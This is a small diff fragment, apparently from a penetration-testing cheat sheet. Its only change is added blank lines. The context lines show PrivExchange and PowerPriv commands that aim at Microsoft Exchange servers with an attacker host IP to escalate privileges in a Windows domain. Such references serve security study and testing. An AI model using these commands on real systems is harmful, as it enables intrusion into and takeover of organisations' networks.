@@ -19,3 +19,5 @@ python privexchange.py -ah 10.0.0.2 mail01.domain.local -d domain.local -u user_
 # https://github.com/G0ldenGunSec/PowerPriv 
 powerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016
 ```
+
+
